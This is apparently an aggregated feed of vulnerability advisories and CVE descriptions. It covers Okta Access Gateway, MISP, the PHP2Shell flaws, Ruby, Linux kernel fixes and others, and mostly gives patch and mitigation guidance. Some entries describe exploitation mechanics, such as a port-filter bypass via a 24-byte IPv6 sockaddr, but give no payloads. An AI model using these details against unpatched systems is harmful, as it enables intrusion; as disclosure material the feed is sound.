Okta Patches Command Injection and Authentication Bypass in Access Gateway

Okta released security updates for Access Gateway to fix a command injection flaw (CVE-2026-115547) and an authentication bypass (CVE-2026-115546) that allow attackers to take full control of the appliance. The updates also address two remote code execution vulnerabilities in the PHP runtime used by the gateway.

**If you run Okta Access Gateway, upgrade it to version 2026.10.2 or later to fix the admin takeover flaws, and install version 2026.44.0 to fix the PHP flaws. Make sure the Admin Console can only be reached from trusted internal IP addresses, and check for any unexpected admin logins or configuration changes.**
#cybersecurity #infosec #advisory #vulnerability

🚨 Critical Okta Access Gateway flaw allows administrators to execute system commands; CVE-2026-115547

The vulnerability affects the Okta Access Gateway Admin Console and carries a CVSS score of 9.1.

Key details:

• Network exploitable
• Low attack complexity
• Administrative access required
• No user interaction required
• Affects OAG versions before 2026.10.2
⠀
Okta has resolved the vulnerability in Access Gateway 2026.10.2. Administrators should manually upgrade affected appliances.

Source:

posts.content: CVE-2026-94372 stored XSS in MISP Galaxies index page, CVSS 5.4. Crafted misp-galaxy tags render unescaped for admins. Patch under review - restrict tag-editor access now. #CVE #infosec #cybersecurity https://www.valtersit.com/cve/CVE-2026-94372/

CVE-2026-94372.description:
MISP contains a stored cross-site scripting (XSS) vulnerability in the default theme's Galaxies index page. When a MISP instance detects unknown custom or default galaxy clusters during synchronization, it renders sample tag names in an informational notice directed at site administrators. In the default theme, these sample tag names were inserted into the HTML output without HTML-entity encoding. A user with tag-editor privileges could craft a malicious misp-galaxy tag containing arbitrary script. When a site administrator subsequently viewed the Galaxies index page, the crafted tag content was interpreted as executable markup in the administrator's browser session, enabling the attacker to read session data, perform actions on behalf of the administrator, or otherwise compromise the administrator's browser context. The Overmind theme already applied HTML escaping to the same values and was not affected. The vulnerability requires the attacker to possess tag-editor-level access to create the crafted tag and requires the victim (a site administrator) to view the Galaxies index page in the default theme. The impact is limited to the administrator's browser session and does not directly compromise the MISP server process.

Version affected: <2.5.47

posts.content: CVE-2026-94381 MISP privilege escalation: read-only API keys can regain full account permissions, up to admin. CVSS 8.8. Patch under review, so restrict API keys and watch for updates now. #CVE #infosec #cybersecurity https://www.valtersit.com/cve/CVE-2026-94381/

CVE-2026-94381.description:
MISP has a security issue that can let a user gain more access than their API key is supposed to allow.

A read-only API key should only let someone view information. However, after logging in with such a key, a specific MISP function could accidentally restore the user’s normal account permissions. This means someone with a read-only API key could potentially gain write, delete, or even administrator access if their underlying account has those permissions.

Exploiting the issue requires a valid read-only API key and a single request to the affected function.

The main impact is that MISP’s API key restrictions can be bypassed, allowing actions that the API key was specifically meant to prevent.




Version affected: <2.5.47

posts.content:
🚨 Ruby fixes three regex engine bugs linked to remote code execution risks

Ruby has released versions 4.0.9, 3.4.12 and 3.3.13 to address three memory corruption bugs in its Onigmo regular expression engine.
⠀
The flaws involve a double free and two integer overflow conditions. GitLab found that specially crafted regex patterns could trigger the bugs and potentially allow remote code execution.

Four GitLab vulnerabilities rely on the underlying issues:

• CVE-2026-89078
• CVE-2026-93577
• CVE-2026-97229
• CVE-2026-110264
⠀
Applications are only exposed when they compile regular expressions from attacker-controlled input. Ruby warns that Regexp.timeout and pattern length limits do not reliably prevent exploitation.

Administrators should update to Ruby 4.0.9, 3.4.12 or 3.3.13 and avoid compiling untrusted regex patterns if an immediate upgrade is not possible.

@jschauma For Debian sid/unstable, there is a patched package in the Bug Tracking System by Salvatore Bonaccorso who is part of the Debian security team; his changes are also in the salsa Git repo).

The bug log seems to indicate that the Debian maintainer doesn't consider there is any hurry for sid. So I downloaded the source package, visually inspected the patch, applied it, verified that the two modified source files were now identical to those from upstream commit b418fa81c48262a86a9 which is referenced at the bottom of the Debian security tracker page for CVE-2026-111497, built the source package and upgraded the relevant binary packages.

To be on the safe side, I also uninstalled libio-compress-brotli-perl which is built from a different source package, although that one is quite possibly not affected by the bug (the package was only recommended by other packages I have installed, not depended on).

CVE-2026-99030.description:
In the Linux kernel, the following vulnerability has been resolved:

net: skbuff: don't leave stale bytes in skb_copy_and_csum_bits()

When skb_copy_and_csum_bits() reaches unreadable frags it returns 0
after copying only the linear part, and the rest of the caller's buffer
is left as it was.  The callers copy into a buffer that is about to go
out on the wire: an ICMP error quoting the offending packet, or a
driver's TX bounce buffer in skb_copy_and_csum_dev().  Neither buffer
is zeroed beforehand, so whatever was in memory there gets sent.

Zero the part of the buffer we didn't fill.  The checksum usually
won't match the data any more, so the receiver will usually drop the
packet, but either way it no longer carries anything it shouldn't.
Only zero for a positive @len, a negative one from a broken caller must
not turn into a huge memset().

CVE-2026-99042.description:
In the Linux kernel, the following vulnerability has been resolved:

io_uring/net: populate CONNECT filter fields for 24-byte sockaddr_in6

io_connect_bpf_populate() fills connect.port and connect.v6_addr for
AF_INET6 only when addr_len >= sizeof(struct sockaddr_in6), i.e. 28
bytes.

The IPv6 connect paths accept SIN6_LEN_RFC2133 (24 bytes), which
already holds sin6_port and sin6_addr. io_connect() passes addr_len to
the socket layer unchanged.

At addr_len 24 the filter sees family AF_INET6 with port and address
zero, while the kernel connects to the real destination. A filter that
denies an IPv6 port or address is bypassed. Denying connect.port == P
rejects [::1]:P with -EACCES at addr_len 28 but connects at addr_len 24.

Use SIN6_LEN_RFC2133 as the threshold. sin6_scope_id stays zero when
absent.

The threshold mismatch was found by an AI coding assistant (Claude Code)
comparing this hook against the net/ipv6 length checks on my
instructions; it also drafted the reproducer and this patch. I verified
the bypass and the fix in a VM on 7.3-rc6 and that 7.2 has the same
code.

posts.content:
PHP2Shell: What Is Easy and What Is Hard to Exploit

PHP2Shell (CVE-2026-109618 and CVE-2026-109619, CVSS 9.2) is a pair of pre-authentication RCE flaws in PHP's request parser, reachable through any PHP endpoint on default configs (session upload progress and file uploads). Crashing a worker is trivial but reliable code execution needs per-build memory offsets. The problem is that one calibrated exploit works on every identical stock image like default docker images.

**If your website or application runs on PHP, update right now to PHP 8.2.35, 8.3.36, 8.4.27 or 8.5.12 and restart all PHP and web server workers, because a patched server with old workers still running is still vulnerable. If you can't patch immediately, set `session.upload_progress.enabled = Off` as a temporary stopgap (it blocks only one of the two attack paths), restart all workers, and watch your logs for memory errors, crashes and web processes starting shells, since a successful attack can look like a perfectly normal request.**
#cybersecurity #infosec #knowledge #awareness
https://beyondmachines.net/event_details/obstacles-to-weaponizing-php2shell-likely-constrain-immediate-widespread-exploitation-0-3-u-e-l/gD2P6Ple2L

posts.content:
Півчетвертої ночі закінчили термінові правки на нашому сервері. Причина в тому, що в світі знайшли дві критичні вразливості в самій мові PHP. Їх назвали PHP2Shell, це CVE-2026-109618 і CVE-2026-109619. Оцінка 9.2 з 10, а для експлуатації не потрібна авторизація.

Основна наша система написана іншою мовою, але кілька окремих сервісів працювали на PHP. Ми несемо відповідальність за все, що крутиться на нашому сервері, тому закрили всі.

Що відомо станом на зараз.

Виправлення вийшли 21 жовтня у версіях 8.5.12, 8.4.27, 8.3.36 та 8.2.35. Старші гілки офіційних патчів не отримали.

Знайшли діри дослідники з допомогою моделей ШІ: першу версію компанія Calif ще в серпні, а Wiz незалежно виявила обидві. Дослідники кажуть, що вада існувала роками, але ШІ зробив її експлуатацію практичною.

Інформація витекла за день до виходу патчу. Спроби атак фіксували ще 17 жовтня, за кілька днів до публічного розкриття. Деякі уряди, за повідомленнями, на час відключили свої сайти.

Масштаб. PHP стоїть на близько 70% сайтів, де відома серверна мова. Це не означає, що стільки зламано: надійних цифр підтверджених зломів поки немає, і дослідники пишуть, що експлуатація складніша, ніж здавалось у перший день. Але ризик реальний, а старих версій без підтримки в мережі дуже багато.

Що зробити вам.

Перевірте, чи є PHP на сервері та в контейнерах: php -v, docker images.
Оновіть PHP і перезапустіть php-fpm або веб-сервер.
Якщо оновитись не можете одразу, вимкніть session.upload_progress.enabled.
Подивіться на дивні дочірні процеси від користувача веб-сервера і нові php файли.
Якщо сервіси були відкриті в мережі з 17 жовтня, змініть ключі та токени.

Бережіть себе і свої сервери 🙏

posts.content:
PHP Group Discloses New Unpatched Remote Code Execution Flaw Following PHP2Shell Updates

The PHP Group disclosed a new unpatched remote code execution vulnerability (CVE-2026-115560) affecting session handlers, following emergency patches for two critical PHP2Shell flaws (CVE-2026-109618 and CVE-2026-109619).

**If you run PHP, first make sure you’ve applied the emergency PHP2Shell patches from two days ago, then turn off session upload progress (session.upload_progress.enabled = Off) unless you actually need it, which blocks this new flaw. Ask your developers whether any code changes the session serializer with ini_set() before session_start(). Apply the official fix for CVE-2026-115560 as soon as PHP releases it.**

posts.content:
⚠️ PHP2Shell (CVE-2026-109618/619, CVSS 9.2): a supply chain perspective.

Everyone says "patch fast." But fast patching creates a blind spot.

In December 2025, 10 months before PHP2Shell, I simulated exactly this on Drupal: MITM + rogue SSL, fake update server, admin installs "the patch", RCE + persistence.

PHP2Shell makes this worse: urgency = less verification of update sources.

Full analysis + hardening guide:
https://dev.to/privlabs/php2shell-supply-chain-why-patching-fast-could-make-things-worse-51h6

@SymfonyStation this may be relevant for the Drupal community.

🚨 Palo Alto Networks warns PAN-OS is affected by PHP2Shell remote code execution flaws

CVE-2026-109618 and CVE-2026-109619 affect the PAN-OS management web interface, including the HTTPS interface and XML API service.
⠀
Affected products include:

• PAN-OS 10.2, 11.1, 11.2, 12.1 and 12.2 release trains
• All Panorama versions
• All WildFire WF-500 and WF-500-B appliances
⠀
No special configuration is required, but the risk is highest when the management interface is exposed to the internet.

Palo Alto Networks rates the product impact at CVSS 8.7. PAN-OS hotfixes are expected between October 26 and 30, while dates for Panorama and WildFire appliance fixes remain unconfirmed.

The company is not aware of malicious exploitation targeting its products.

GlobalProtect and Captive Portal are not affected.

Source:

posts.content:
PHP 漏洞通報是個失誤

原發文者承認，自己曾在 Hacker News 提前提及 PHP 即將修補的兩項可造成遠端程式碼執行（RCE, Remote Code Execution）的弱點，編號為 CVE（Common Vulnerabilities and Exposures，公開資安弱點編號）-2026-109618 與 CVE-2026-109619。他原本只是想提醒同樣自行編譯 PHP 的人儘快留意更新，卻意外干擾協調式弱點揭露（coordinated disclosure，讓修補與公開時程配合的做法），使既定公開時程調整，也增加許多人的應變負擔，因此公開致歉並表示願意承擔責任。

他說，發文當下完全不知道存在保密期限（embargo）；他的消息來源告知沒有保密約定，而對方也是從更上游得到相同說法。這起事件讓他深感不安、睡眠受影響，並認為自己的善意提醒造成了意料之外的連鎖效應。他也表示，日後會更謹慎處理未公開的資安訊息。

posts.content:
Півчетвертої ночі закінчили термінові правки на нашому сервері. Причина в тому, що в світі знайшли дві критичні вразливості в самій мові PHP. Їх назвали PHP2Shell, це CVE-2026-109618 і CVE-2026-109619. Оцінка 9.2 з 10, а для експлуатації не потрібна авторизація.

Основна наша система написана іншою мовою, але кілька окремих сервісів працювали на PHP. Ми несемо відповідальність за все, що крутиться на нашому сервері, тому закрили всі.

Що відомо станом на зараз.

Виправлення вийшли 21 жовтня у версіях 8.5.12, 8.4.27, 8.3.36 та 8.2.35. Старші гілки офіційних патчів не отримали.

Знайшли діри дослідники з допомогою моделей ШІ: першу версію компанія Calif ще в серпні, а Wiz незалежно виявила обидві. Дослідники кажуть, що вада існувала роками, але ШІ зробив її експлуатацію практичною.

Інформація витекла за день до виходу патчу. Спроби атак фіксували ще 17 жовтня, за кілька днів до публічного розкриття. Деякі уряди, за повідомленнями, на час відключили свої сайти.

Масштаб. PHP стоїть на близько 70% сайтів, де відома серверна мова. Це не означає, що стільки зламано: надійних цифр підтверджених зломів поки немає, і дослідники пишуть, що експлуатація складніша, ніж здавалось у перший день. Але ризик реальний, а старих версій без підтримки в мережі дуже багато.

Що зробити вам.

Перевірте, чи є PHP на сервері та в контейнерах: php -v, docker images.
Оновіть PHP і перезапустіть php-fpm або веб-сервер.
Якщо оновитись не можете одразу, вимкніть session.upload_progress.enabled.
Подивіться на дивні дочірні процеси від користувача веб-сервера і нові php файли.
Якщо сервіси були відкриті в мережі з 17 жовтня, змініть ключі та токени.

Бережіть себе і свої сервери 🙏

CVE-2026-99053.description:
In the Linux kernel, the following vulnerability has been resolved:

tipc: hold a reference to nodes found by link name

tipc_node_find_by_name() returns a node after dropping its RCU read lock
without taking a reference.  The LINK_SET, LINK_GET and LINK_RESET_STATS
handlers then lock and access the node, racing with timer-driven cleanup of
a down peer.  Generic netlink serialization does not exclude the node
timer.

The following interleaving can leave a handler using a freed node:

  CPU 0: find the node under RCU and release the node read lock
  CPU 1: tipc_node_timeout() clears the links and unlinks the down node
  CPU 1: drop the list and timer references, queuing tipc_node_free()
  CPU 0: leave the RCU read-side critical section
  CPU 1: complete the grace period and free the node
  CPU 0: acquire the node lock through the stale pointer

LINK_SET also uses the node's media address after releasing the node lock,
when passing queued packets to tipc_bearer_xmit().

KASAN on v7.3-rc5 reported:

  BUG: KASAN: slab-use-after-free in _raw_read_lock_bh
  Write of size 4 at addr ffff88807e06f008 by task poc/92
  Call Trace:
   _raw_read_lock_bh                 kernel/locking/spinlock.c:287
   tipc_nl_node_set_link             net/tipc/node.c:2475
   genl_family_rcv_msg_doit          net/netlink/genetlink.c:1114
   genl_rcv_msg                      net/netlink/genetlink.c:1209
   netlink_rcv_skb                   net/netlink/af_netlink.c:2575

  Allocated by task 0:
   tipc_node_create                  net/tipc/node.c:539
   tipc_node_check_dest              net/tipc/node.c:1196
   tipc_disc_rcv                     net/tipc/discover.c:252

  Freed by task 92:
   kfree                             mm/slub.c:6801
   rcu_core                          kernel/rcu/tree.c:2919

  Last potentially related work creation:
   __call_rcu_common.constprop.0     kernel/rcu/tree.c:3181
   tipc_node_timeout                 net/tipc/node.c:814

Acquire a reference to the selected node with kref_get_unless_zero() before
leaving RCU, returning NULL if the node has already been released.  Release
that reference on every caller exit after the last node access, including
transmission in LINK_SET.  Keep the existing link lookup order and locking
so concurrent link removal still takes the existing error paths.

posts.content: CVE-2026-94379 MISP auth bypass CVSS 9.1: unauthenticated attackers skip bruteforce protection, OTP checks and login logging via alternate HTTP methods. Patch under review - track it closely. #CVE #infosec https://www.valtersit.com/cve/CVE-2026-94379/

CVE-2026-94379.description:
The login() function in MISP's UsersController.php contained insufficient HTTP method validation for several security-critical code paths. The original code used an allowlist approach, checking only for specific HTTP methods (POST and PUT) before enforcing bruteforce protection, email one-time-password (OTP) verification, and login-failure logging. Because the checks were not exhaustive, an unauthenticated attacker could issue login requests using other HTTP methods and bypass all three security controls simultaneously. Specifically: 

 - the bruteforce blocklisting check and attempt counter were skipped, allowing unlimited credential-guessing attempts without being rate-limited or blocked
 -  the email OTP two-factor authentication step was skipped, defeating the second factor of authentication
 - login-failure events were neither logged nor counted, removing the audit trail and the mechanism that would normally trigger a blocklist entry.




The security impact is the effective disabling of brute-force protection and multi-factor authentication for any attacker who can craft an HTTP request with a non-POST/PUT method to the login endpoint, potentially leading to credential compromise and unauthorized access to the MISP instance.





Version affected: <2.5.47

CVE-2026-99051.description:
In the Linux kernel, the following vulnerability has been resolved:

fsverity: RCU-delay the freeing of struct fsverity_info

__fsverity_get_info() calls rhashtable_lookup_fast(), which just uses
rcu_read_lock() and doesn't directly synchronize with
fsverity_remove_info().

For the same inode this isn't a problem: its fsverity_info is removed
only at inode eviction time or upon failure to enable verity, when the
inode no longer needs its fsverity_info and it will no longer be
accessed via that inode.

However, this is broken and can cause a use-after-free for concurrent
__fsverity_get_info() for *different* inodes.  Those rely on following
fsverity_info::rhash_head in the rhashtable under rcu_read_lock() only.
They also use fsverity_info::inode to do the key comparison.

Fix this by RCU-delaying the freeing of 'struct fsverity_info' after
it's been removed from the rhashtable.

In the Linux kernel, the following vulnerability has been resolved:

CVE-2026-99050.description:
In the Linux kernel, the following vulnerability has been resolved:

gpio: mpsse: fix race when arming the IRQ poll worker

gpio_mpsse_irq_enable() arms the poll worker before publishing it:
schedule_work() runs before the worker is added to priv->workers. If
gpio_mpsse_disconnect() walks the list in that window it misses the
worker, and once disconnect returns, the USB core frees mpsse_priv
while the orphaned gpio_mpsse_poll() work keeps accessing it, causing
a use-after-free.

Fix this by publishing and arming the worker in one irq_spin
critical section. Teardown walks the same list under irq_spin, so a
worker found on the list is guaranteed to be armed, and
cancel_work_sync() handles it whether it is queued or running.

A worker armed after the disconnect walk would still be missed, so
also set a new priv->dying flag under irq_spin before the teardown
walk, and check it in the same critical section, freeing it via
kfree_rcu() instead when the device is going away, since kfree()
would be called with the IRQ core's raw spinlock held and may sleep
on PREEMPT_RT. schedule_work() is safe to call with irq_spin held,
and the next probe gets a fresh mpsse_priv, so the flag never needs
to be cleared.

This issue was found by an in-house static analysis tool.

posts.content: CVE-2026-94374: MISP IDOR in EventReport processing lets authenticated users overwrite reports via client-supplied id, CVSS 8.1. Patch not final yet. Restrict access and track the fix at #CVE #infosec #MISP https://www.valtersit.com/cve/CVE-2026-94374/

CVE-2026-94374.description:
MISP contains an insecure direct object reference vulnerability in the processModuleResultsData method of the Event model. When processing module results, the code iterates over EventReport entries supplied in the resolved data and saves each one. Unlike the adjacent attribute and object processing loops, the report loop did not unset the client-supplied 'id' field before calling save(). Because the MISP EventReport model's create() method does not strip the id field, an authenticated user with permission to submit module results could include an 'id' value referencing an existing report belonging to a different event. Upon save(), the ORM would update that existing row rather than insert a new one, allowing the attacker to 

 - read the content of another event's report by reparenting it into their own event
 - overwrite the report's fields with attacker-controlled data
 - change the report's event_id to redirect ownership. 




This constitutes an authorization bypass through a user-controlled key, enabling cross-event data disclosure and integrity compromise. The vulnerability requires an authenticated session with the ability to invoke module result processing on an event.

Version affected: <2.5.47

CVE-2026-99059.description:
In the Linux kernel, the following vulnerability has been resolved:

wireguard: noise: reject response consumption after intermediate initiation

Two threads begin processing the identical response message, received
twice. The first thread, A, runs. While it's running, the second one,
B, gets partway through, and during that slow calculation, or even while
blocking on down_write(), A completes and then also a handshake
initiation that's already been queued up runs in thread C, which itself
takes that same down_write(). The handshake initiation creation
succeeds, and sets the state back to waiting-for-response, and calls
up_write(), at which point thread B resumes, because either its finished
its calculations or was finally allowed to acquire down_write(). Thread
B then copies the state back to the peer, and begins a new session,
using that state, which is the same session as the one made in thread A.

Thread A			Thread B			Thread C

down_read()
 sA = handshake->state
 memcpy(cA, handshake->crypto)
up_read()
if (sA != 1)
 goto fail
slow_crypto(cA)
				down_read()
				 sB = handshake->state
				 memcpy(cB, handshake->crypto)
				up_read()
				if (sB != 1)
				 goto fail
				slow_crypto(cB)
down_write()
 if (sA != handshake->state)
  goto fail
 memcpy(handshake->crypto, cA)
 handshake->state = 2
up_write()
down_write()
 if (handshake->state != 2)
  goto fail
 derive_session(handshake->crypto)
up_write()
								down_write()
								 slow_crypto(handshake->crypto)
								 handshake->state = 1
								up_write()
				down_write()
				 if (sB != handshake->state)
				   goto fail
				 memcpy(handshake->crypto, cB)
				 handshake->state = 2
				up_write()
				down_write()
				 if (handshake->state != 2)
				  goto fail
				 derive_session(handshake->crypto)
				up_write()

This seems basically impossible to hit in a meaningful way in practice,
but ensure that it absolutely cannot happen by comparing the ephemeral
private key that's on the stack with the latest one that the peer's
handshake state has.

CVE-2026-99056.description:
In the Linux kernel, the following vulnerability has been resolved:

strparser: make sure __strp_recv isn't running before tearing down the parser

The comment above strp_done() claims that if strp is stopped,
strp_recv will no longer be called. That's only true if the caller has
a mechanism (eg locking) to guarantee that strp_recv() calls that
started before strp_stop() have completed by the time we call
strp_done().

This adds a dummy lock_sock/release_sock pair to guarantee that any
in-flight strp_recv() (which runs under either bh_lock_sock or
lock_sock, depending if it's called from ->sk_data_ready or strp_work)
has completed.

Only espintcp can be affected by this race condition, but this patch
makes sure no future user of strp can have the bug.

This could crash on strp->sk ("general mode" of strp), but this mode
has been here for 9 years and has never been used. It'll be gone soon,
no point worrying about it.

Switch the stopped/paused/etc bits to u8's to avoid races between
strp_stop() and strp_pause/unpause().

A reproducer has been published and turns the possible UAF into an
exploit [1].

tipc_topsrv_stop() closed subscriber connections while the topology

CVE-2026-99054.description:
In the Linux kernel, the following vulnerability has been resolved:

tipc: destroy topsrv workqueues before closing connections

tipc_topsrv_stop() closed subscriber connections while the topology
server's send and receive workqueues were still running. Socket
callbacks and subscription events could then queue more work, and
in-flight send/recv work could drop the last connection reference
during the conn_idr walk.

That race produced several teardown failures: refcount_t addition on
0 from conn_get() on a connection whose release was blocked on
idr_lock, a subsequent use-after-free in tipc_conn_close(),
queue_work() on an already destroyed workqueue from the listener
data-ready callback, and an RCU stall in tipc_topsrv_exit_net()
while the walk spun under idr_lock.

Clear srv->listener under idr_lock so it acts as a shutdown flag,
skip queue_work() once it is NULL, destroy the workqueues to flush
in-flight work, and only then close the remaining connections.
Refuse tipc_conn_lookup() after that flag is cleared, and drop
idr_lock when the teardown walk finds no connection, so an
in-flight subscription event cannot pin idr_in_use while the
walk holds the lock.

v3 supersedes the narrower in-thread diff Tung Quang Nguyen
posted on 2026-09-23. It keeps his teardown order and adds the
lookup refusal and the empty-idr unlock.

posts.content:
🚨 PHP warns of another unpatched remote code execution risk; CVE-2026-115560

The newly disclosed vulnerability is separate from the two PHP2Shell flaws patched earlier this week and is not fixed by PHP 8.5.12, 8.4.27, 8.3.36 or 8.2.35.
⠀
PHP says exploitation requires an unusual configuration where an application:

• Uses php_binary or php_serialize as its session serializer
• Changes the serializer to php at runtime before session_start()
• Has session upload progress enabled
⠀
PHP considers the risk unlikely and plans to release a fix during its next regular update cycle.

Until then, administrators with affected configurations should set:

session.upload_progress.enabled=0

Applications that do not change the session serializer at runtime are not exposed through this path.

No exploitation has been reported.

Source:
https://www.php.net/

CVE-2026-99064.description:
In the Linux kernel, the following vulnerability has been resolved:

cipso: adjust cached option offsets when removing CIPSO

cipso_v4_skbuff_delattr() removes the CIPSO bytes but does not adjust
cached offsets for options that follow them.

For example, with a valid 10-byte CIPSO option followed by a seven-byte
RR option, parsing records rr at offset 30.  Removing CIPSO moves RR to
offset 20, while the cached offset remains 30.  Consumers such as
ip_forward_options() and __ip_options_echo() then access the wrong bytes;
the latter may interpret packet data as the option length and copy it into
fixed-size option storage.

Mirror cipso_v4_delopt() and subtract cipso_len from the srr, rr, ts and
router_alert offsets when they follow CIPSO.  cipso_len is the distance
the first memmove() shifts those options.  The later header move and
network-header reset relocate the bytes and their offset base together.

CVE-2026-99078.description:
In the Linux kernel, the following vulnerability has been resolved:

net/mlx5e: Prevent stale XSK buffer release on MPWQE refill retry

With AF_XDP on a striding RQ, mlx5e defers releasing XSK buffers until
an MPWQE is refilled. If XSK allocation then returns -ENOMEM,
actual_wq_head is not advanced and a later NAPI poll retries the same
WQE.

mlx5e_free_rx_mpwqe() leaves each released slot marked as releasable. On
retry it can therefore call xsk_buff_free() again through stale pointers
after the frames have returned to the XSK pool and been reallocated.

Set all skip_release_bitmap bits in the common error path of
mlx5e_xsk_alloc_rx_mpwqe(). This matches mlx5e_alloc_rx_mpwqe(). A
successful allocation already clears the bitmap after replacing every
buffer, so retries become idempotent without changing the success path.

Fault injection forced three consecutive failures for one selected MPWQE.
Both an early allocation failure and a partial 8-of-16-buffer unwind
released the original 16 XSK buffers only once. Each error left a full
bitmap, the following NAPI retry skipped the release, and a later
successful allocation cleared it. A 20-second AF_XDP zero-copy pressure
run exercised 1,575,262 buffer allocation failures without invalid
descriptors, WQE errors, or kernel warnings.

CVE-2026-99083.description:
In the Linux kernel, the following vulnerability has been resolved:

ksmbd: fix heap out-of-bounds write in krb5_authenticate()

In krb5_authenticate(), out_len is calculated to determine available
headroom in response_buf for the incoming Kerberos AP-REP token. However,
when SMB2_SESSION_SETUP is processed as a non-first element of a compounded
SMB2 request, the calculation omits work->next_smb2_rsp_hdr_off.

This causes out_len to overstate remaining buffer headroom by
the cumulative size of prior responses in the compound chain. Consequently,
the length check in ksmbd_krb5_authenticate()
(*out_len <= resp->spnego_blob_len) passes erroneously, allowing memcpy()
to write the AP-REP blob past the end of response_buf into adjacent kernel
heap memory.

Fix this by subtracting work->next_smb2_rsp_hdr_off when computing out_len,
ensuring it accurately reflects physical remaining buffer space.

posts.content: CVE-2026-94383: code execution in MISP blocklist workflow via unvalidated filename extension, CVSS 7.2. Patch under review - restrict export dir execution now. #CVE #infosec #MISP https://www.valtersit.com/cve/CVE-2026-94383/

CVE-2026-94383.description:
The MISP blocklist workflow module accepted a user-supplied blocklist filename parameter without validating the file extension. The only sanitization applied was basename() to strip path components and a check for empty or dot values. A site administrator could specify a filename with an arbitrary extension that would be placed in the MISP export directory. If the underlying web server is configured to interpret and execute scripts from that directory, the resulting file could be invoked, leading to arbitrary code execution in the context of the web server process.

The vulnerability requires the attacker to hold site-administrator privileges within MISP, as the blocklist workflow module is restricted to that role. No additional user interaction is required beyond triggering the workflow action with a crafted filename parameter. The impact is full compromise of the MISP server's confidentiality, integrity, and availability, as arbitrary script execution grants the attacker the same privileges as the web server user.

Version affected: <2.5.47

posts.content: CVE-2026-16651: DoS in Temporal sqlparser (CVSS 6.5) - a crafted MySQL version comment with empty or 1-5 digit content triggers a Go panic on attacker-controlled SQL parsing, killing apps that don't recover. Patch status: under review. https://www.valtersit.com/cve/CVE-2026-16651/

CVE-2026-16651.description: temporalio/sqlparser can panic when Parse, ParseStrictDDL, or ParseNext processes a MySQL version comment whose contents are empty or consist only of one to five decimal digits. ExtractMysqlComment does not check the -1 result returned by strings.IndexFunc before using it as a slice boundary. The resulting Go runtime panic propagates unless the caller recovers it on the parsing goroutine, so applications that parse attacker-controlled SQL can terminate. Temporal Server exposes the affected parser through ListWorkers. When that API is enabled, an authenticated caller with namespace read permission can submit a malformed query that terminates the receiving Matching process. Repeated requests can sustain a denial of service. The issue affects availability only; no confidentiality or integrity impact was identified.

🔴 CVE-2026-115933 - Critical (9.9)

Postiz signs its session, invitation and password reset tokens with one shared secret and without any marker of what a token is for. A route that refreshes the credentials of a browser-extension channel signed data taken from the request itself an...

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-115933.description:
Postiz signs its session, invitation and password reset tokens with one shared secret and without any marker of what a token is for. A route that refreshes the credentials of a browser-extension channel signed data taken from the request itself and stored the result where the requesting user can read it back. A user could therefore obtain a validly signed token containing any claims they choose, which the application accepts as a session, as an organization invitation with a chosen role, as a password reset or as an enterprise provisioning token.

A second, narrower route that creates team invitations signs extra fields from the request body in the same way.

CVE-2026-114820.description: Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE).  Supported versions that are affected are Oracle Java SE: 8u511-b32, 8u511-perf-b32, 11.0.33.0.2, 17.0.21.0.2, 21.0.13.0.2, 25.0.5.0.2, 27.0.1.0.2; Oracle GraalVM for JDK: 17.0.21.0.2 and  21.0.13.0.2; Oracle GraalVM Enterprise Edition: 21.3.20.0.2. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVE-2026-16652.description: Temporal Server did not bound the work performed while searching for a Schedule's next action time. An authenticated caller with namespace write permission could create or update a Schedule that combines a fine-grained cadence with an exclusion calendar that rejects every candidate time, causing the server to evaluate excluded candidates without a per-search work budget. This can consume excessive CPU in Frontend and Schedule worker components. A persisted specification can also cause its backing Schedule Workflow to repeatedly fail and retry, allowing CPU consumption to continue without additional requests until the Schedule is deleted or its backing Workflow is terminated. Repeated or parallel exploitation can deny service. The issue affects availability only; it does not expose or modify Workflow data.

🟠 CVE-2026-99082 - High (8.8)

In the Linux kernel, the following vulnerability has been resolved:

KVM tags the per-vCPU MMIO cache with a memslot generation so that a

CVE-2026-99082.description:
In the Linux kernel, the following vulnerability has been resolved:

KVM: x86: Use active memslots for the per-vCPU MMIO cache

KVM tags the per-vCPU MMIO cache with a memslot generation so that a
memslot update invalidates cached MMIO information.  Both the fill and
validation paths use kvm_memslots(), which unconditionally selects address
space 0, even when the vCPU is running in SMM and using address space 1.

Commit 56f17dd3fbc4 ("kvm: x86: fix stale mmio cache bug") added the
memslot generation to the cache key so that a memslot update could not
leave a stale entry valid.  When commit 699023e23965 ("KVM: x86: add SMM
to the MMU role, support SMRAM address space") added the SMM address space,
these helpers were not converted to use the active memslots.

Consequently, an update to the SMM memslots can leave an entry from the old
SMM address space apparently valid after the vCPU returns to the normal
address space.  A guest can then cause an access to valid RAM at the same
GFN to be returned to userspace as KVM_EXIT_MMIO.

Completing that exit through the VMM's RAM address space writes the backing
page without going through KVM's write-tracking path.  If the page backs a
nested EPT table, KVM can continue using shadow translations derived from
the old contents.  The WARN_ON_ONCE() in kvm_mmu_write_protect_fault()
catches this invalid cache and memslot combination.

Use the vCPU's active memslots when caching and validating the entry.
Memslot generations are unique across address spaces, so the generation
also distinguishes the normal and SMM views.  This matches the MMIO SPTE
cache, which already uses kvm_vcpu_memslots().

On an unpatched current-mainline kernel, a regression test that fills the
cache in SMM and updates only the SMM memslots fails the intended RAM write
and triggers the kvm_mmu_write_protect_fault() warning.  With this change,
the same test completes the RAM write without a warning.  The x86/smm_test,
set_memory_region_test, and memslot_modification_stress_test selftests also
pass.

CVE-2026-99081.description:
In the Linux kernel, the following vulnerability has been resolved:

bnxt_en: fix DMA mapping length for padded small packets

Stefan Fleischmann reported Intel IOMMU DMA Read faults on BCM57412
NetXtreme-E NICs when transmitting packets on VLAN/macvlan interfaces:

  DMAR: [DMA Read NO_PASID] Request device [18:00.0] fault addr 0xfc499000
        [fault reason 0x06] PTE Read access is not set
